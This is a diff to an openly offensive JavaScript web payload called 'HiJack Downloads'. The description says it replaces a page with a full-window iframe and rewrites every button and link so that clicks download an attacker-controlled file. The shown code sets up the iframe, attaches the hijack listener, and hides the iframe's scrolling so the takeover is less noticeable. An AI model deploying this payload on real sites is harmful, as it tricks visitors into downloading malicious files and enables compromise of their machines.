@@ -1,3 +1,11 @@
+HiJack Downloads
+
+------$$gr4y-r0se$$------
+
+Checks if the payload is already running, and if not, renders the application in an iFrame. Then, anytime the user navigates, updates the URL, and changes the onlick of any button or anchor tag to instead download a fiel that's attacker controlled.
+
+------$$gr4y-r0se$$------
+
 if (window.self === window.top) {
 
     function newDownloadFunction(event) {
@@ -24,7 +32,7 @@ if (window.self === window.top) {
     }
     var body = document.getElementsByTagName('body')[0];
     const page_url = location.pathname;
-    body.innerHTML = '<iframe src="" id="hijacked" style="border: none;"></iframe>';
+    body.innerHTML = '<iframe src="" id="hijacked"  scrolling="no" style="border: none;  overflow: hidden;"></iframe>';
     resizeIframe();
     const iframe = document.getElementById('hijacked');
     iframe.addEventListener('load', hijack_buttons);
